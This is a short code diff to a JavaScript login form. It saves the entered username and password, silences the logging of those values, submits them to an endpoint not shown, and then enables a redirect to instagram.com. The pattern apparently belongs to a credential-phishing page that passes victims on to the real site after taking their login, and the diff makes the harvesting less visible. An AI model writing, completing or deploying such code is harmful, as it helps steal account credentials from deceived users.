@@ -4,11 +4,11 @@ let password;
 const handlechangeusername = (e) => {
   username = e.value;
 
-  console.log("e:", e.value);
+  //console.log("e:", e.value);
 };
 const handlechangepassword = (e) => {
   password = e.value;
-  console.log("e:", e.value);
+  //console.log("e:", e.value);
 };
 
 const handleSubmit = async () => {
@@ -25,5 +25,5 @@ const handleSubmit = async () => {
   );
   const deneme = await response.json();
   console.log(deneme);
-  //window.location.href = "https://www.instagram.com/";
+  window.location.href = "https://www.instagram.com/";
 };
